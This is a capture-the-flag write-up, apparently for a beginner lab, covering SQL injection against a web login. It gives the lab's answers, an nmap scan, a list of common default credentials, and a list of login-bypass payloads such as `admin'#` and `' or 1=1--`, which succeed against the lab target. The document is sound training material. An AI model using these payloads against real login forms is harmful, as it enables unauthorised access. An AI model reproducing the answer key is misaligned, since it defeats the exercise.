## 1. Questions
- Task 1
	- What does the acronym SQL stand for?
		- `Structured Query Language`
- Task 2
	- What is one of the most common type of SQL vulnerabilities?
		- `SQL Injection`
- Task 3
	- What is the 2021 OWASP Top 10 classification for this vulnerability?
		- `A03:2021-Injection`
- Task 4
	- What does Nmap report as the service and version that are running on port 80 of the target?
		- `Apache httpd 2.4.38 ((Debian))`
- Task 5
	- What is the standard port used for the HTTPS protocol?
		- `443`
- Task 6
	- What is a folder called in web-application terminology?
		- `directory`
- Task 7
	- What is the HTTP response code is given for 'Not Found' errors?
		- `404`
- Task 8
	- Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains?
		- `dir`
- Task 9
	- What single character can be used to comment out the rest of a line in MySQL?
		- `#`
- Task 10
	- If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned?
		- `Congratulations`
- Submit Flag
	- Submit root flag
## 2. Tools Used
- Linux
- CLI
- nmap
- curl
- SQL
## 3. Approach
### nmap scan
- Useful resource
	- https://www.stationx.net/nmap-cheat-sheet/
```bash
sudo nmap -sSVC -Pn -n --disable-arp-ping -T4 10.129.93.83
```
- Flags
	- `-sSVC` - SYN, service, and default sript scan.
	- `-Pn` - Exclude ICMP scanning.
	- `-n` - Exclude name resolution.
	- `--disable-arp-ping` - Exclude `arp` scanning.
	- `-T4` - Use speed template `aggressive`.
- Result
```
<snip>
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Login
<snip>
```
### Test webserver response
#### curl
- Useful resource
	- https://devhints.io/curl
```bash
curl -i 10.129.93.83
```
#### Browser
![](../Assets/Screenshot%202025-09-17%20at%2009.25.22.png)
### Research common login credentials
- Usernames
	- https://portswigger.net/web-security/authentication/auth-lab-usernames
	- https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials#:~:text=Try%20the%20following%20usernames%20%2D%20%E2%80%9Cadmin,%E2%80%9Ctesting%E2%80%9D%20and%20similar%20names.
- Passwords
	- https://en.wikipedia.org/wiki/List_of_the_most_common_passwords
	- https://outpost24.com/blog/it-admins-weak-password-use/
### Test webserver login
- Usernames
	- `admin`
	- `administrator`
	- `root`
	- `system`
	- `guest`
	- `test`
- Passwords
	- `qwerty`
	- `password`
	- `admin`
	- `root`
	- `admin@123`
- Unable to login using example usernames and passwords
### Research common login form vulnerabilities
- https://www.strongdm.com/blog/authentication-vulnerabilities
- https://medium.com/stolabs/understanding-potential-vulnerabilities-in-authentication-mechanisms-bc488c5d8637
- https://owasp.org/www-project-top-ten/
- https://owasp.org/Top10/A03_2021-Injection/
- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection
- https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/#:~:text=Bypassing%20login%20screens%20(SMO%2B)
### Test login form for sql injection vulnerability
- Useful resource
	- https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/#:~:text=Bypassing%20login%20screens%20(SMO%2B)
- Test payloads (with arbitrary password)
	- `admin' --`
	- `admin' #`
	- `admin'/*`
	- `' or 1=1--`
	- `' or 1=1#`
	- `' or 1=1/*`
	- `') or '1'='1--`
	- `') or ('1'='1--`
- Logged in successfully with payload `admin'#` as the username and `test` as the password
### Retrieve the flag
- Presented upon login
![](../Assets/Screenshot%202025-09-17%20at%2009.24.44.png)